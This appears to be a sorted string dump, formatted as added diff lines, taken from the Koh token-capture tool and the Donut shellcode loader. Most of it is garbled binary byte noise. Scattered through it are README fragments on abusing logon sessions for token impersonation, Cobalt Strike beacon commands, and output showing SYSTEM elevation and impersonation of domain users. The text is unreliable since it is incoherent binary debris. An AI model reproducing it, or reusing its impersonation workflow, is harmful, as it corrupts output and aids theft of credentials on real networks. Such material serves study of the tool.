+HEQ(H
+HEXHMHUJ
+HEXM
+HF0H
+HF8H
+HF8Hy
+HFHim
+HFT>H
+HG HG
+HG(SH
+HH 9Y
+HH H
+HH [
+HH [>H
+HH [@UHH@HEHMHEH
+HH [H
+HH [H%
+HH$@
+HH(H
+HH(HL$
+HH(Ht
+HH0H
+HH3H
+HH4H
+HH8H
+HH98u
+HH:mm:ss
+HH@H
+HH@t
+HHA DC8AHH
+HHA8<
+HHAA
+HHD$
+HHD$ 
+HHD$ @
+HHD$ Hu
+HHD$(HD$ 
+HHD$(HD$(
+HHD$(HHD$(HD$(
+HHD$0D$ 
+HHD$8H
+HHD$8HHD$@D$0
+HHD$@HD$@@
+HHD$HD$ 
+HHD$PHT$pHL$Pc
+HHD$XHD$X@
+HHE03H
+HHEEHA
+HHEHHLM@HD$ A
+HHEHH}@LM@HD$ E3H}H3HEL}@A
+HHH [H%-
+HHH4A
+HHH<
+HHHD$0
+HHHH
+HHHHX
+HHHcL$ HT$(
+HHHt
+HHHt2HHfD94GuH
+HHI3K@
+HHIHHI
+HHKPs
+HHL$ -
+HHL$ D
+HHL$ I
+HHL$ L
+HHL$(
+HHL$0H3H
+HHL$H
+HHLL$ E3T$X3
+HHMH3
+HHMH39HxA_A
+HHMHIpHMHIXHMHI
+HHPH
+HHT$
+HHT$0H8
+HHXH
+HHc-
+HHd$0
+HHd7u'
+HHfD94FuH4FH
+HHhH
+HHpH
+HHt$(I
+HHt%MHH
+HHtGMIV
+HHtLH
+HHtOHd$8
+HHtXHtSHH
+HHtdx
+HHtjL@
+HHtlLA
+HHtuHtgL$P
+HHtyH
+HHu3
+HHu7
+HHuO
+HHxH
+HHxWI96tRI
+HI H
+HI(H
+HI(H8
+HI3H
+HI3HHGH
+HI3I
+HI3K@
+HI8H
+HI94uA
+HIAE
+HID8}
+HIHAHL$@$
+HIHD
+HIHHX
+HIHLH L@
+HIHtdLL
+HIUd
+HIXH
+HIc}<E3I
+HIoH
+HItx$
+HIuH3
+HK Ht
+HK QA
+HK(Ht
+HK8Ht
+HK8vu
+HKAHC
+HKH90t
+HKHH
+HKHHKH
+HKHIc
+HKHIcCT
+HKHL
+HKhH
+HKpH
+HKphH
+HKxH
+HL$ 
+HL$ /t
+HL$ 3
+HL$ :
+HL$ @H
+HL$ H
+HL$ H3
+HL$ HD0p
+HL$ HH
+HL$ HP
+HL$ HQ(H
+HL$ Ih
+HL$ Ip
+HL$ M
+HL$(
+HL$(0
+HL$(1
+HL$(3H
+HL$(H
+HL$(H3fH0[H8d$(
+HL$(HM
+HL$(HMHL$ 3
+HL$(UH
+HL$(e2
+HL$(g0
+HL$0
+HL$0$
+HL$0.
+HL$0A
+HL$0D$(
+HL$0E
+HL$0H
+HL$0H$
+HL$0H3HHD$0A
+HL$0H3HHD$0D$ 
+HL$0HHD$0@
+HL$0HHD$0H
+HL$0HpH(HL$
+HL$0I
+HL$0R
+HL$0R:
+HL$0g
+HL$0l
+HL$0p$
+HL$0u
+HL$8
+HL$8H
+HL$8Ht
+HL$8IHL$XLL$hMLD$x.4
+HL$8u
+HL$8wu$HD$8HL$8L$8
+HL$@
+HL$@8$
+HL$@H
+HL$@H3
+HL$@I
+HL$@Lt$PLt$hLt$pDt$xfDuDuDuL
+HL$@X
+HL$@[HvA@
+HL$@n
+HL$@o 
+HL$D
+HL$H
+HL$HD$8L
+HL$HEHD$@H
+HL$HK
+HL$P
+HL$P$
+HL$PD
+HL$PD8
+HL$PH
+HL$PH3
+HL$PH@
+HL$PHL$8H
+HL$PHd$0
+HL$PLD$DA
+HL$PLD$HA
+HL$PQ
+HL$PS
+HL$Pc
+HL$XD$@L
+HL$XE3E3L}L}HQ
+HL$XHT$@LHL$0MHL$
+HL$XHT$PLHL$0LHL$
+HL$X_u
+HL$Xu
+HL$X{4
+HL$h
+HL$hHT$
+HL$hHx
+HL$hUu
+HL$pHT$HAE
+HL$x
+HL(3
+HL(H
+HL(H$
+HLAL
+HLDDt$(3Lt$ 3HctKHHHt.Lt$8DLt$0L
+HLH$
+HLIC847u
+HM H1E
+HM H39
+HM Hu
+HM$W
+HM'H
+HM'IL$
+HM0L
+HM3fC
+HM8C
+HM8e@
+HM@5HM@H ]@UH HHMHH
+HM@D
+HM@b
+HMAH
+HMBL
+HMD3E
+HMDLD
+HMDuDuDuV
+HME3
+HMH3CL$
+HMHHC 
+HMHIhzHMHIHmHMHIP
+HMHIxSHMH
+HMHL$ E3HE33
+HMHM
+HMHUE3
+HMHe
+HMHe'
+HMIIu
+HMLL$HDH
+HMLMDE
+HML}'L}/AL}7D}
+HMN34P67R9TWCXYF
+HMt$@
+HMvH
+HMz.
+HOHO
+HOHt
+HPA_A
+HPHHM
+HPHt
+HP]E3fD9
+HP]Ht
+HQ(3A
+HQHAT
+HQQHQQHQQQ
+HQQfQH
+HR{HHT$8H
+HS HD$(H
+HS HMHC
+HS4HC 
+HS8H$
+HS8HH
+HS8HHtQH=
+HS8HHtQH=BL5/A
+HSDLD$HHH
+HT$ 
+HT$ 3
+HT$ H@
+HT$ HD$ $
+HT$ HD$ D
+HT$ HL$ A
+HT$ HL$(0
+HT$ HL$(2
+HT$ HP
+HT$ HR(H
+HT$ HR(HL
+HT$ w
+HT$(
+HT$(H
+HT$(W
+HT$0
+HT$0Aj
+HT$0H
+HT$0H$
+HT$0HO0V8HA
+HT$4d$0
+HT$8A
+HT$8HL$03t
+HT$8x]
+HT$@
+HT$@H
+HT$@HI
+HT$@IE3
+HT$@L
+HT$HAE
+HT$HE
+HT$HEtMAs
+HT$HH
+HT$HHZ
+HT$P
+HT$PA
+HT$PHE3
+HT$XHL$H
+HT$hH
+HT$p
+HT(3L$
+HT(B
+HTTP
+HU8HHH9:t
+HU8fDg
+HU@HM
+HUEH$
+HUEHME@
+HUHAH
+HUHAT$8L
+HUHELEHE HEHUHE(HEHM0HEHEH
+HUHELMHE
+HUHIHHu
+HUHM
+HUHM E(E
+HUHM H
+HUJL(
+HV(H
+HV83A
+HV8E3I
+HVPHX
+HW(H
+HX w
+HXHp
+HXIH
+HZHHt
+HZHUHM
+H[=J6RMq!
+H]LLmL4I
+H_(H_
+HbHt
+Hc@<HL$@H
+HcD$ 
+HcD$ HL$(
+HcD$$H
+HcD$(H
+HcEH
+HcH=O.
+HcHA
+HcHHH
+HcI4Hu:I
+HcIHHM
+HcIcL
+HcL$
+HcL$ 
+HcLI
+HcS8K0HKX
+HcpAp<C0L
+Hd$ 
+Hd$(
+Hd$0
+Hd$@
+He8A_A
+HeapAlloc
+HeapFree
+HeapReAlloc
+HeapSize
+HfD7HMHUHMHMH}H}LuDuY
+HfD90t
+HfL$
+HhD$(
+HhHT$
+HideSolutionNode = FALSE
+Hk HtSHu
+Hk<H
+Hk<I
+HkHL$
+HkHT$
+HkXH
+Hl$0H
+Hl$0H]
+Hl$HLd$8LL$(Ll$0Hd$
+Hl$PH
+Hl$PH]@HuHH}PH
+Hl$XH
+Hl$XH0A_A
+Hl$hH
+Hl$hHH
+Hl$hHt$pH
+Hl$hHt$pH0A_A
+Hl$hHt$pH@A_A
+Hl$hHt$pHP_@SH HL
+Hl$hHt$pHP_E3xH
+Hl$hHt$pHP_H
+Hl$hHt$pHP_HHX
+However
+Hp WATAUAVAWH
+Hp WHPHIHHA
+HpDP
+Hp]H
+HqH3
+Hs(H
+HsHK
+Ht D
+Ht!H
+Ht$ UWAVH$H@
+Ht$ WATAUAVAWH IMLLHt
+Ht$ WAVAWH H
+Ht$ WAVAWH0AAHA
+Ht$ WH HH
+Ht$(
+Ht$0L$(ML$ HM_]HUH 
+Ht$83H
+Ht$8H _H(H
+Ht$8HH
+Ht$@f@@f
+Ht$PH
+Ht$hH A_A
+Ht$hH0A_A
+Ht$xHP_H
+Ht(D
+Ht/ygH
+Ht0H
+Ht0SH H
+Ht1HT$
+Ht2Hd$8
+Ht2L
+Ht3H
+Ht3HD$pD$(
+Ht6Hd$8
+Ht9Hd$8
+Ht:MZ
+Ht<3EL$
+Ht<Hd$8
+Ht=C
+Ht=H
+Ht=MZ
+Ht>HH<
+HtBHA HO
+HtD>
+HtEt)t
+HtG8
+HtHtH
+HtIHL$ aHT$(H8
+HtLHtGHtBD$
+HtMtL$
+HtQLL
+HtRL$
+HtZH
+Hta8
+HtbMt
+HtoHt]A
+HttY
+HttpOpenRequestA
+HttpQueryInfoA
+HttpSendRequestA
+HtzE33AQ
+Ht}m
+Hu/_
+Hu3HVHd$ 
+Hu8H 
+Hu8HEH
+Hu9H
+HuE H
+HuELu
+HuH 
+HuHUHM@u
+HuI E3A
+HuUH
+HuhH}pH
+HuhH}pHe0A_A
+Huo(H
+Hus33p
+Hv-ZH
+Hw lLv
+HwIff
+Hx ATAVAWH HA
+Hx ATAVAWH L
+Hx ATAVAWH0LcMAHLc
+Hx AUAVAWH@H:
+Hx AVH
+Hx AVH 
+Hx AVH 3E3HcH=
+Hx AVH HcHxk
+Hx AVH Hy
+Hx AVH IADH3H
+Hx AVH LB
+Hx AVH@
+Hx AVH@HT$xHHHMApo
+Hx AWHP3IcEEHH
+Hx HH
+Hx L@
+HxD$ 
+HxH(H=
+HyE3IH
+HzD$ 
+H{8H
+H}HH}H}HL$0H}M
+H}LEH}LE
+I AE
+I!>u
+I'm sure that no attackers will change the indicators mentioned above.
+I've been coding for a decent amount of time. This is one of the weirder and frustrating-to-track-down bugs I've hit in a while - please help me with this lol.
+I/HUH
+I3HHIL
+I3L%L<
+I7HMt
+I9<t
+I>3H
+I>HH
+I@8t$HtsLT$PIIO
+IAfHQQfQQ
+IAuH
+IAuHH
+IBD>IcH
+ICMK
+IDHt$ 
+IDl$0
+IED$
+IG@L
+IH I
+IH(IP8H
+IH33M3H[
+IH4H
+IHD$08
+IHE8H
+IHHE3LH
+IHHHu
+IHIAHD$ 
+IHL$ HD$
+IHL$0THD$8x
+IHMt
+IHT$4HD$ r
+IHd$ 
+IHkH
+IHt$8HH
+IHt4MHI
+II r
+IIAu
+IIB<
+IIHHtvJ
+IIHL
+IIcHLI
+IIruG
+IJHE
+IKAI
+IL$pI
+ILHt3HHA8
+IM3H
+IM3L
+IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+IN(IF0LHEHL
+IN0E3
+IN8HT$PH
+IN8LM
+IT$pHL$ p
+IVPL$@
+I[ Ik0IA
+I[ Is(I{0IA_A
+I[(Ik0IA
+I[(Is0IA
+I[(Is8IA
+I[0Ik@IA_A
+I[0Ik@IsHIA_A
+I[0Is8I{HIA_A
+I[8Ik@IA_A
+I_H(
+I_H(3
+I_LMu
+IcHD$HH0
+InitializeCriticalSectionAndSpinCount
+InitializeCriticalSectionEx
+InitializeSListHead
+InitializeSecurityContext()
+Inject Functions 
+InternetCloseHandle
+InternetConnectA
+InternetCrackUrlA
+InternetOpenA
+InternetReadFile
+InternetSetOptionA
+Invalid URL length.
+Invalid URL.
+Invalid architecture specified.
+Invalid bypass option specified.
+Invalid entropy level specified.
+Invalid parameter.
+Is I]H
+Is I_A
+Is I_HHX
+Is I_Hd$ 
+Is I{(IA
+Is WAVAWH0Lc3MA
+IsDebuggerPresent
+IsProcessorFeaturePresent
+IsValidCodePage
+It3H
+ItHc
+Iu3H
+IuHE
+Iw3H
+I{ I]H
+I{ Ms(I]H8AD$(
+J II
+JBHEHU(f
+JD(HE
+JD0J
+JHD$ 
+JHD$0
+JMtHE
+JScript
+JTHT$ 
+January
+July
+June
+K(HC
+K0@HHKH
+K81c8
+K>VR>>e
+KAHD$@H
+KERNEL32.dll
+KHEA
+KHEH
+KURU
+Koh is a C
+Koh is licensed under the BSD 3-Clause license.
+Koh.bin
+Koh.exe
+Koh.exe Koh.exe <list 
+KohClient.cna
+L!This program cannot be run in DOS mode.
+L$ A
+L$ AED
+L$ DH
+L$ EHMH
+L$ L
+L$(AHD$ 
+L$(D3HD$ 3Vpe
+L$(H$
+L$(HD$ 
+L$0=2
+L$0L
+L$0QPS
+L$0t$8
+L$4RQ
+L$@DT$D
+L$@rEN
+L$@rExRHMHUHT$0
+L$ID
+L$hQPV4
+L$pA:u
+L$pIHD$8H$
+L$xH
+L3Hlu
+L3I[
+L3dHtH
+L8@1
+L8Hux3yrDE
+L9H$0
+L=AMP
+L>ev[%>
+LA(H
+LA(HHQHY
+LAHA8
+LAXI
+LAy9
+LBLI AE
+LC(HH
+LC(HHSPLF
+LCMapStringEx
+LCMapStringW
+LD$ H$8
+LD$ LD$@HD$HHL$PHT$XHD$ HD$(HD$0LL$(LD$@HT$0H$
+LD$(3IHDLI
+LD$0HD$PX
+LD$8
+LD$83H
+LD$8H
+LD$@H
+LD$@HD$HLL$XLT$
+LD$@HH
+LD$@L4J
+LD$@LHL$8H$
+LD$D)E3H
+LD$DH
+LD$HI
+LD$PH
+LD$pd$0
+LD$xHT$H
+LDHD$ HT$PI
+LDIA
+LE(HU
+LE3Hd$
+LEfuHx
+LF(HHV0]
+LH H(H@
+LHC0HuH
+LHD$@H
+LHD$@HP
+LHEL
+LHHX
+LHHm[
+LHHqt
+LHHu
+LHL$0LH
+LHL$0LHL$pHL$(3H
+LHT$0H
+LHXALHu
+LHd$0
+LHu3Hc
+LHu{
+LI H
+LI(HQHH
+LIB<
+LIC8<(uH
+LIHL'L3HPMtH
+LIM3I
+LK(DHh
+LK(H
+LL$ H8HD$HHD$(
+LL$ H8HD$PHD$(LL$(E3HT$HHL$@gD$ HD$(
+LL$ LD$
+LL$ LD$0T$XHL$Pt
+LL$ VWAVH
+LL$ WH I
+LL$ WH II
+LL$ WH IIH
+LL$ WH0I
+LL$(
+LL$(E3HT$@HoD$ HD$(
+LL$0DHT$@I
+LL$0HHT$@
+LL$0L
+LL$@D$
+LL$@DH
+LL$@Mu
+LL$HLHHn7
+LL$HMH
+LL$HfD$@EB
+LL$PA@
+LL$PH
+LL$PHD$(DHD$ 
+LL$XD
+LL$pC
+LL$xL$
+LL$xMHT$pA
+LLI E
+LLl$0V@H$
+LLl$@L
+LME33
+LMHELEHE
+LMHELMHE
+LMHUDHL$Di
+LMLEHUHM
+LMUYL
+LMt5Mt0Ht
+LQXAI
+LT$ HT$@
+LT(L$
+LUAHu
+LUHELMAHUA
+LUID         : 1677733
+LUID         : 67556826
+LUID         : 67568439
+LZNT1
+Lc@<E
+LcAH
+LcHIAH
+LcHIEH
+LcLEAu
+Lct%L$
+Lcz<MHLA
+Ld$ 
+Ld$(
+Ld(3H
+LeL}
+LeaveCriticalSection
+Ll0H 
+Ll0L 
+LoadLibraryA
+LoadLibraryExW
+LoadTypeLib
+LocaleNameToLCID
+LogonType    : Interactive
+LogonType if a negotiate session is present
+Lp AWH0MIHL
+Lp UHH@
+Lp UHhH
+Lt$0H
+Lt$hH@]
+Lt$xI
+Lt$xL$
+Lt(3H
+Lt(D
+L}LLeIIH}PI
+L}L}L}L}L}
+M!>y0IF
+M0':
+M1yn(_d
+M3I3IHM
+M3LT$
+M7I_8M
+M8U@
+M<7>=
+MBHAB8
+MCIS D$PIK
+ME33HG
+ME33HV
+MF H
+MH [H
+MH3J8
+MH=/
+MHHL$D
+MHMDEEB
+MHUE
+MHUHHUXM
+MHUfD
+MIAuAD
+MIHHHu
+MILHI'
+MILK@
+MLMLuAHUE
+ML}Au
+MM/dd/yy
+MMIH_
+MMLHu
+MQMQMQVP
+M]1yn
+M_HD$@H
+MapViewOfFile
+March
+Me L$
+Memory allocation failed.
+MinimumVisualStudioVersion = 10.0.40219.1
+Monday
+More information: http://www.ibsensoftware.com/
+Mp=A
+Mt)I
+Mt13AB8IH0L
+Mt>Q<
+MtH$
+MtIY
+MtM<It
+MtMtH
+Mt_QI
+Mu LLHHH
+Mu(H{
+MuIu
+MultiByteToWideChar
+NAN(IND)
+NAN(SNAN)
+NH(H
+NHKXH
+NHcD$ 
+No error.
+None
+Note:
+November
+NtContinue
+NtCreateToken()
+OH ]@UH H
+OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+OZQ%
+Ob{!@f
+October
+Only lists results that have the domain admins (-512) group SID in their token information:
+OpenClipboard
+Or=)a
+Origin LUID  : 1676720
+Origin LUID  : 1677765
+Origin LUID  : 999
+P 3H
+P(Hp
+P0L$@
+P9B4
+P@LA
+PAD8Ht
+PD$ PfF
+PD>!M
+PPx3D9$
+PQR$
+PS0D$
+PS0U
+PSD$LD$$D$$PSB$
+PSV4
+PSV4tI0@
+PSV4tIN
+PSYYt
+PSht$
+PUStd$L
+PUSty
+PVS<
+PVS{
+PVUg
+PW83S<
+PXHK
+PeekNamedPipe
+Pj@WUVH
+Pj@WUVHt
+Pp3H(
+Pt$ S4E
+Pt$DStL$
+Pt$DStd$
+Q(x0
+Q8HI(.
+QAADAA
+QHD$(HHD$(HD$(
+QHD$HHtHL
+QHtIHL$ 
+QNAN
+QQQUQQS
+QSVt$
+QUjPVVSPD$XD$
+QueryPerformanceCounter
+RDD$pL@
+RH@]@UH H
+RHD$(HHD$(A%
+RHD$@x
+RTTI
+RY>-Hu
+RaiseException
+Random Names
+Random names 
+ReadConsoleW
+ReadFile
+Release
+Rt1Hd$8
+RtlCaptureContext
+RtlCompressBuffer
+RtlCreateUnicodeString
+RtlDecompressBufferEx
+RtlEqualString
+RtlEqualUnicodeString
+RtlExitUserProcess
+RtlExitUserThread
+RtlGetCompressionWorkSpaceSize
+RtlInitUnicodeString
+RtlLookupFunctionEntry
+RtlUnicodeStringToAnsiString
+RtlUnwind
+RtlUnwindEx
+RtlVirtualUnwind
+S-1-5-21-937929760-3187473010-80948926-512
+S-1-5-21-937929760-3187473010-80948926-513
+S-1-5-21-937929760-3187473010-80948926-525
+S-1-5-21-937929760-3187473010-80948926-572
+S-1-[0-59]-
+S03fD$P3D$R
+S0HHu
+S3HM
+SEC_E_NO_CREDENTIALS
+SERVICES
+SH H
+SH HHI
+SNAN
+SSV 
+ST$ 
+SUV$
+SUV$L
+SUV@0W$
+SUVH
+SUVWATAUAVAWHX
+SUVWATAVAWH 
+SUVt$ 3W
+SUl$$
+SVWj<
+SYSTEM (admin)
+SYSTEM token from winlogon
+SafeArrayCreate
+SafeArrayCreateVector
+SafeArrayDestroy
+SafeArrayGetLBound
+SafeArrayGetUBound
+SafeArrayPutElement
+Saturday
+SeCreateTokenPrivilege
+SeImpersonatePrivilege
+SeTcbPrivilege
+September
+Server:
+SetClipboardData
+SetEndOfFile
+SetEnvironmentVariableW
+SetFilePointerEx
+SetLastError
+SetStdHandle
+SetUnhandledExceptionFilter
+Sleep
+SolutionGuid = {19CD90DA-BCD6-40AA-B080-0C8B82595CB8}
+SptJ3
+StO9>T'4
+Sunday
+SysAllocString
+SysFreeString
+SystemTimeToTzSpecificLocalTime
+T$  
+T$0H
+T$8HD
+T$@ADT$8
+T$dE
+T$dL$
+T$dR3t$H@fD$H
+T$hD$D
+T$pD$D
+T$xD
+TRACE</DefineConstants>
+TUUUU
+Target architecture cannot support selected DLL/EXE file.
+Temp>Koh.exe capture
+Temp>Koh.exe list
+Temp>Koh.exe monitor S-1-5-21-937929760-3187473010-80948926-512
+TerminateProcess
+The 
+The SSPI [AcquireCredentialsHandle()](https://docs.microsoft.com/en-us/windows/win32/secauthn/acquirecredentialshandle--negotiate) call has a 
+The [KB2871997](https://support.microsoft.com/en-us/topic/microsoft-security-advisory-update-to-improve-credentials-protection-and-management-may-13-2014-93434251-04ac-b7f3-52aa-9f951c14b649) patch introduced a 
+The compression engine is invalid.
+The current usable client is a Beacon Object File at 
+The output format is invalid.
+The unique TypeLib GUID for the C
+There was an error during compression.
+This file has no relocation information required for in-memory execution.
+Thursday
+TlsAlloc
+TlsFree
+TlsGetValue
+TlsSetValue
+TokenLeakDetectDelaySecs
+Tuesday
+U3Et
+U838
+U8@:
+U8LE(He(
+U8k<
+UATAUAVAWHhH
+UAVAWHhH
+UH$@H
+UH$H
+UH$pH
+UHH HA3
+UHH@HE
+UHH@e(
+UHHP3HHHtif9
+UHHPEuJ3
+UHHpHHHu
+UHK0H
+UKH@
+UPMH
+URRichTR
+USER32.dll
+USx3L$
+USxl$ 
+UTF-16LEUNICODE
+UTF-8
+UUUUUU
+UVWATAUAVAWH
+UVWATAUAVAWH$H
+UVWATAUAVAWH$H 
+UVWATAUAVAWH03LHu
+UVWATAUAVAWH@H
+UVWATAUAVAWHH
+UVWATAUAVAWHl$H
+UVWAUAVHH0Hae8
+UVWAVAWH HHX
+UVWAVAWH HHd
+UVWAVAWH@H
+UVWAVAWHH
+UVWAVAWHH03D
+UVWHH@@II
+UWATAVAWHHp3HLHu
+UWAVH$
+UWAVH$0H
+UWSWWW$
+Unable to locate DLL function provided. Names are case sensitive.
+UnhandledExceptionFilter
+UnmapViewOfFile
+Unrecognized
+Username     : THESHIRE
+Uu(E
+V0AD9@
+V0Du
+V0LHt>E
+V3Ft$
+V6E>
+V8>(.
+V@3LLcH<L
+VAVAWHPME3E3DD$pHD$
+VB4>
+VBScript
+VCA< t(<
+VHEH
+VHHH
+VHLH
+VUS@
+VVVVVUPQ
+VWATAVAWH0
+VWATAVAWp
+VWAVH HY
+VWAVH0H
+VWAVH0d$P
+VWAVH@
+VWAVP
+VWHh
+VYS9>HVo6>a
+VirtualAlloc
+VirtualFree
+VirtualProtect
+VirtualQuery
+VisualStudioVersion = 16.0.29009.5
+Vj@PD$
+Vr.>Tz3
+W.YYt
+W4L$
+WATAUAVAWH DL5
+WATAUAVAWH ELHc
+WATAUAVAWH H:E3MILLH
+WATAUAVAWH L=
+WATAUAVAWH0HI3MLLH@84)u
+WATAUAVAWH@HMIILd
+WATAUAVAWHp$
+WAVAWH DH
+WAVAWH H
+WAVAWH LHtt3L=W
+WAVAWH033E3HLBT=
+WAVAWH0L3MA
+WAVAWH@H:
+WAVAWH@HHHu
+WAfA
+WD$ 
+WD$(P 
+WH -
+WH 3
+WH 3H
+WH 3H9=0
+WH 3H=)
+WH 3HH
+WH 3LH
+WH A
+WH AL
+WH ELHu
+WH H
+WH H=
+WH HH
+WH HH=:H4
+WH HHH
+WH HHHu
+WH HHK
+WH HHtFHtAH
+WH HHu
+WH HHxDC
+WH HL
+WH HM
+WH HT
+WH HY
+WH Hc3
+WH HcAH[Hu
+WH HcH
+WH HcdHu
+WH IAHA
+WH IHHHt
+WH IHMu
+WH IIHMu
+WH L
+WH LB
+WH Y
+WH eH
+WH0AIHH'/
+WH0Hd$ H
+WH0LH5bA
+WH0d$ 
+WH:H
+WH@3AHHHu
+WH@AHAHL$ 
+WH@H
+WH@H=.
+WH@HHHu
+WH@IHHHu
+WHD$XD9x
+WHH 
+WHII
+WHII_ff
+WHP$
+WHP3IHHH
+WHPAIL
+WHPH
+WHPH$
+WHPI0
+WHPIcIHE
+WHpHIHAHL$P$
+WINBASEAPI DWORD WINAPI KERNEL32$GetLastError (VOID)
+WINBASEAPI HANDLE WINAPI KERNEL32$CloseHandle (HANDLE)
+WINBASEAPI HANDLE WINAPI KERNEL32$DisconnectNamedPipe (HANDLE)
+WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentThread (void)
+WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap()
+WINBASEAPI int __cdecl MSVCRT$printf(const char 
+WINBASEAPI int __cdecl MSVCRT$sprintf(char 
+WINBASEAPI int __cdecl MSVCRT$strncmp(const char 
+WINBASEAPI size_t __cdecl MSVCRT$strlen(const char 
+WINBASEAPI void 
+WMLl$PHHEE}
+WPD$(PRQ
+WPEL$@
+WPl$(}<
+WRQ0W
+WScript
+WT$ ua>
+WTSQueryUserToken()
+WUVH
+WUVH3@
+WVIHII
+WWWWU
+WWt$TL$
+WYYt
+WaitForSingleObject
+We brainstormed a few ways to a) hold open logon sessions and b) abuse this for token impersonation/use of cached credentials.
+We have tried (with no success):
+Wednesday
+When the Koh server starts is opens up a named pipe called 
+WideCharToMultiByte
+WldpIsClassInApprovedList
+WldpQueryDynamicCodeTrust
+Wn<D.x
+WriteConsoleW
+WriteFile
+WuBXIDH
+X/4B
+XL@<
+XXXot$ HX
+XfD$TD$TPD$
+Xntdll
+Xot$ HX
+Xpress
+Xpress Huffman
+Y HA Hp
+YHD$(HHD$(HD$@x
+YHEA
+YHXH
+YPt}E
+YXY%s
+YYYYYX
+YYu@
+You've supplied parameters for an unmanaged DLL. Donut also requires a DLL function.
+Yt7j
+Z(HZ
+ZD$D
+ZHD$(HHD$(HD$(
+ZLD$ L
+[@USVWHHHc3HM(u(H
+[Bb]in/
+[Byte[]] $buf = 
+[Dd]ebug/
+[H(@SH 7G
+[H(K
+[H8H
+[HHt
+[MMu
+[Oo]bj/
+[Rr]elease/
+[Vt$
+[YQSVt$
+[]E3Ht$ E333oYH
+[]E3Lt$ E333HH
+[aOni
+[assembly: ComVisible(false)]
+] Command: capture
+] Command: list
+] Command: monitor
+] Creating impersonation named pipe: 
+] Creating impersonation named pipe: %s
+] Current group SIDs set for capture filtering:
+] Elevated to SYSTEM
+] Enabled SeImpersonatePrivilege
+] Impersonated THESHIRE
+] Impersonated token successfully duplicated.
+] Impersonation succeeded. Duplicating token.
+] New Logon Session - 6/22/2022 2:51:46 PM
+] New Logon Session - 6/22/2022 2:52:17 PM
+] New Logon Session - 6/22/2022 2:53:01 PM
+] Starting server with named pipe: imposecost
+] Successfully negotiated a token for LUID 1677733 (hToken: 980)
+] Successfully negotiated a token for LUID 207990196 (hToken: 848)
+] Successfully negotiated a token for LUID 81492692 (hToken: 976)
+] Successfully negotiated a token for LUID {session.Luid} (hToken: {hToken})
+] Targeting group SIDs:
+] Tasked beacon to get userid
+] Tasked beacon to run: dir 
+] Using KohPipe                    : 
+] Using KohPipe                    : %s
+] You are NT AUTHORITY
+] You are THESHIRE
+] f2-
+] received output:
+]3DT$0ELEfEHM
+]@SH 3Ht
+]@SH@H
+]@SUVWATAUAVAWH8LcHIH
+]@UH H38E8
+]@UHHpH
+]@USVWATAUAVAWH$HH
+]BD>KP
+]D8Ut
+]E3H
+]E3Ht$ E333%H
+]EHUDt$(L$ HM_H 
+]H(Hu
+]HD$(HL$0
+]HD$@x
+]HE(LMHELEHE
+]HHX
+]HHt
+]HT$
+]Hd$ 
+][@USVWATAUAVAWH$(H
+][HHX
+][Hu
+][MtL$
+]oUgHD$0
+]t$$
+_(HHG
+_(H_
+_@SH HL
+_A>pP
+_DD$
+_E3H
+_E3Ht$ E33
+_Exit
+_H(D$
+_HA 
+_HHt
+_HSH
+_Ht3HIL
+_ID8/u
+_LI[
+_RDATA
+_Str)
+_U JW
+_][$
+______/  
+__argv
+__based(
+__cdecl
+__clrcall
+__eabi
+__fastcall
+__p___argv
+__p___wargv
+__p__acmdln
+__p__wcmdln
+__pascal
+__ptr64
+__restrict
+__stdcall
+__swift_1
+__swift_2
+__thiscall
+__unaligned
+__vectorcall
+__wargv
+_acmdln
+_c_exit
+_cexit
+_exit
+_u'D$
+_w[R/
+_wcmdln
+a@UH HH
+aED$
+aHEH
+aPLib
+aPLib v1.1.1  -  the smaller the better :)
+abcdefghijklmnopqrstuvwxyz
+abcdefghijklmnopqrstuvwxyz{
+abort
+advantages)
+advantages-disadvantages-versus-traditional-credential-extraction)
+alias koh {
+amd64
+amd64(default).
+amsi
+and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
+approach)
+apt-get install gcc-mingw-w64
+b=})>
+bEnabled) != 0) {
+bLD$ H$8
+beacon> getuid
+beacon> help koh
+beacon> koh groups 67568439
+beacon> koh impersonate 67568439
+beacon> koh list
+beacon> shell dir 
+beacon_command_register(
+bf0wn
+bp(=>
+buff 
+build.sh
+byte[] my_buf = new byte[%d] {
+c0CAsHH
+c0CT
+c0iN>/
+c@UH HH
+capture
+char 
+cleanup:
+compilation)
+continue
+copy constructor closure'
+csmu(H=N
+d$8H
+d343
+d8L$
+dHD$(
+dHD$PH
+dNj5
+da (S-1-5-21-937929760-3187473010-80948926-1145)
+dc.theshire.local
+default constructor closure'
+define BUFSIZE 1024
+define CALLBACK_ERROR       0x0d
+define CALLBACK_OUTPUT      0x0
+define CALLBACK_OUTPUT_OEM  0x1e
+define CALLBACK_OUTPUT_UTF8 0x20
+disadvantages)
+dn9>
+duplicatedToken)) {
+dynamic atexit destructor for '
+dynamic initializer for '
+d{2}-
+e<Ht
+eF>tH
+eIEt
+eLK(w
+eh vector constructor iterator'
+eh vector copy constructor iterator'
+eh vector destructor iterator'
+eh vector vbase constructor iterator'
+eh vector vbase copy constructor iterator'
+else
+endif
+endregion
+example---capture)
+example---listing-logon-sessions)
+example---monitoring-for-logon-sessions-with-group-sid-filtering)
+execute-assembly
+exit
+f) }m
+f)>0'
+f3>fvw=>
+f9/u
+f95.t
+f9=Oz
+f9={
+f:ar
+f:zw
+f=oj
+f@E:
+fA90u
+fAwH
+fAyfExGI
+fD$@Sp3
+fD$@Spd$
+fD9$
+fD93s
+fD96s
+fD96uLt$8H
+fD9O
+fDL$ UVWHH
+fE9S
+fL$ HL$ f
+fL$0E3
+f]fDu
+ffff
+fg0wn'Yb
+fl$0HT$0
+ftNfA
+fuft
+fuft2H
+gHK(H
+gLI[
+getsystem
+gfffA
+gmsmr
+group-sid-filtering)
+gu!C
+h0'DA
+hH(L
+hL$P
+hS=q)
+harmj0y
+harmj0y (S-1-5-21-937929760-3187473010-80948926-1104)
+high-integrity
+hpx (
+http://
+https://
+i3H(HT$
+i686-w64-mingw32-gcc -c KohClient.c -o KohClient.x86.o 
+i935
+iDuDd$0
+iHHO Hl$XH
+iHtH
+iL$P
+if DEBUG
+imposecost
+imposingcost
+include <stdio.h>
+include <windows.h>
+int    length
+int    size
+interactive
+iocs)
+ipev 
+j D$8j
+jPSX
+k(t($
+kE>fvwM>
+kHH8HL$
+kT$p
